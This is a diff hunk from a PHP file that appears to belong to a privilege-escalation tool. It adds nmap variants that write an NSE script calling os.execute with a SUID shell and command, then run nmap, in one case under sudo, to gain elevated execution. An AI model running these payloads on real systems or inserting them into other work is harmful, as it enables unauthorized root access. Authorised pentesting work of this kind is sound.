@@ -2440,8 +2440,12 @@ reset; sh \"$via_suid -c $cmd\" 1>&0 2>&0  ";
 
 	            case "nmap":
 	                $data = "TF=\$(mktemp) && echo \"os.execute(\\\"$via_suid -c $cmd\\\")\" > \$TF && $sudo nmap --script=\$TF ";
+	                echo "$data\n";
 	                $data = "$this->file_path --script <(echo \"os.execute(\\\"$via_suid -c $cmd\\\")\")";
-	                $data_sudo = "$via_sudo $data";
+	                echo "$data\n";
+	                $data = "echo \"os.execute(\\\"$via_suid -c $cmd\\\")\" > /tmp/script_wan.nse && $this->file_path --script=/tmp/script_wan.nse ";
+	                echo "$data\n";
+	                $data_sudo = "echo \"os.execute(\\\"$via_suid -c $cmd\\\")\" > /tmp/script_wan.nse && sudo $this->file_path --script=/tmp/script_wan.nse ";
 	                
 	                break ;
 	            case "node":
